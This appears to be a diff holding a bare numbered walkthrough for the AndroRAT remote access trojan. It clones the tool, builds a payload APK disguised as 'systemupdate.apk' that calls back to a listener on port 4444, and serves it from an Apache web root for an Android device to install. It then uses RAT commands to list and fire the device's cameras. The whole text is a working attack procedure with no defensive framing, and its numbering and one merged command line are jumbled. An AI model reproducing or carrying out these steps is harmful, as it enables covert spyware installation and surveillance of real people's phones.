@@ -1,0 +1,37 @@
+1     Andro RAT Git Clone-
+
+
+3     git clone https://github.com/karma9874/AndroRAT.git
+
+4     cd AndroRAT/
+
+5     ls
+
+6     pip install -r requirements.txt cat requirements.txt
+
+7     python3 androRAT.py --build -i 192.168.47.130 -p 4444 -o systemupdate.apk
+
+8     ls -l
+
+10    python3 androRAT.py --shell -i 0.0.0.0 -p 4444
+
+11
+9     ls -lt
+
+12    OPEN A NEW TERMINAL-
+13
+14    sudo systemctl start apache2.service
+
+15    clear
+
+16    cd AndroRAT/
+
+17    sudo cp systemupdate.apk /var/www/html/
+
+18    Open up your android device and search-192.168.47.130/systemupdate.apk
+
+19    help
+
+20    camlist
+
+21   takepic 0
